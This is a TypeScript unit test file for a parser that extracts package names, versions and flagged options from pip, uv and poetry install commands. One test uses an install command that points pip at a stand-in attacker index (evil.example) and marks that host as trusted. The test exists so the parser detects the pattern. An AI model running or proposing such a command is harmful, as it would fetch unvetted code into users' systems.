import { test } from "node:test";
import assert from "node:assert/strict";
import { parsePipInstalls } from "../installParser";

const names = (text: string): string[] => parsePipInstalls(text).packages.map((p) => p.name);

test("basic pip install with several packages and flags", () => {
  const r = parsePipInstalls('pip install requests flask==2.0 "numpy>=1.2" -U --break-system-packages');
  assert.deepEqual(r.packages.map((p) => p.name), ["requests", "flask", "numpy"]);
  assert.equal(r.packages[1].versionSpec, "==2.0");
  assert.equal(r.packages[2].versionSpec, ">=1.2");
});

test("span points at the package name", () => {
  const line = "pip install requests flask";
  const r = parsePipInstalls(line);
  const flask = r.packages[1];
  assert.equal(line.slice(flask.span.startCharacter, flask.span.endCharacter), "flask");
});

test("extras are separated from the name", () => {
  const r = parsePipInstalls("pip install uvicorn[standard,foo]>=0.20");
  assert.equal(r.packages[0].name, "uvicorn");
  assert.deepEqual(r.packages[0].extras, ["standard", "foo"]);
});

test("shell and notebook prefixes", () => {
  assert.deepEqual(names("!pip install aaa"), ["aaa"]);
  assert.deepEqual(names("%pip install bbb"), ["bbb"]);
  assert.deepEqual(names("$ pip install ccc"), ["ccc"]);
  assert.deepEqual(names("sudo pip3 install ddd"), ["ddd"]);
  assert.deepEqual(names("python -m pip install eee"), ["eee"]);
  assert.deepEqual(names("py -m pip install fff"), ["fff"]);
  assert.deepEqual(names("uv pip install ggg"), ["ggg"]);
  assert.deepEqual(names("uv add hhh"), ["hhh"]);
  assert.deepEqual(names("poetry add iii --group dev"), ["iii"]);
});

test("commented install commands are found", () => {
  assert.deepEqual(names("# pip install flask"), ["flask"]);
});

test("prose mentioning pip install is ignored", () => {
  assert.deepEqual(names("# Run pip install first"), []);
  assert.deepEqual(names("You should pip install the package"), []);
  assert.deepEqual(names("skip install this"), []);
});

test("commands inside strings stop at the closing quote", () => {
  assert.deepEqual(names('os.system("pip install foo bar")'), ["foo", "bar"]);
  assert.deepEqual(names("subprocess.run('pip install baz', shell=True)"), ["baz"]);
});

test("chained commands are all parsed", () => {
  assert.deepEqual(names("pip install a1 && pip install b2; pip install c3"), ["a1", "b2", "c3"]);
});

test("trailing comment and redirect end the command", () => {
  assert.deepEqual(names("pip install flask  # web framework"), ["flask"]);
  assert.deepEqual(names("pip install flask > log.txt"), ["flask"]);
});

test("environment markers are dropped from the version spec", () => {
  const r = parsePipInstalls('pip install "foo>=1.0; python_version < \'3.9\'"');
  assert.equal(r.packages[0].name, "foo");
  assert.equal(r.packages[0].versionSpec, ">=1.0");
});

test("requirements file, editable, custom index and trusted host produce notes", () => {
  const r = parsePipInstalls(
    "pip install -r requirements.txt -e ./mylib --extra-index-url https://evil.example/simple --trusted-host evil.example realpkg",
  );
  assert.deepEqual(r.packages.map((p) => p.name), ["realpkg"]);
  const kinds = r.notes.map((n) => n.kind);
  assert.deepEqual(kinds, ["requirements-file", "editable", "custom-index", "trusted-host"]);
  assert.equal(r.notes[2].detail, "https://evil.example/simple");
});

test("--flag=value form is handled", () => {
  const r = parsePipInstalls("pip install --index-url=https://x.example/simple foo");
  assert.deepEqual(r.packages.map((p) => p.name), ["foo"]);
  assert.equal(r.notes[0].kind, "custom-index");
  assert.equal(r.notes[0].detail, "https://x.example/simple");
});

test("URL, VCS and direct-reference requirements are notes, not packages", () => {
  const r = parsePipInstalls("pip install git+https://github.com/x/y.git https://x.example/p.tar.gz mypkg @ https://x.example/mypkg.zip");
  assert.deepEqual(r.packages, []);
  assert.deepEqual(r.notes.map((n) => n.kind), ["url-requirement", "url-requirement", "url-requirement"]);
});

test("local paths and wheel files are notes", () => {
  const r = parsePipInstalls("pip install . ./pkg C:\\tmp\\x.whl foo-1.0-py3-none-any.whl");
  assert.deepEqual(r.packages, []);
  assert.equal(r.notes.length, 4);
  assert.ok(r.notes.every((n) => n.kind === "local-path"));
});

test("multi-line text reports the right line numbers", () => {
  const r = parsePipInstalls("import os\n\npip install foo\n");
  assert.equal(r.packages[0].span.line, 2);
});

test("CRLF input works", () => {
  const r = parsePipInstalls("pip install foo\r\npip install bar\r\n");
  assert.deepEqual(r.packages.map((p) => p.name), ["foo", "bar"]);
});

test("empty and unrelated text produce nothing", () => {
  assert.deepEqual(parsePipInstalls("").packages, []);
  assert.deepEqual(parsePipInstalls("x = 1\nprint('hi')").packages, []);
});
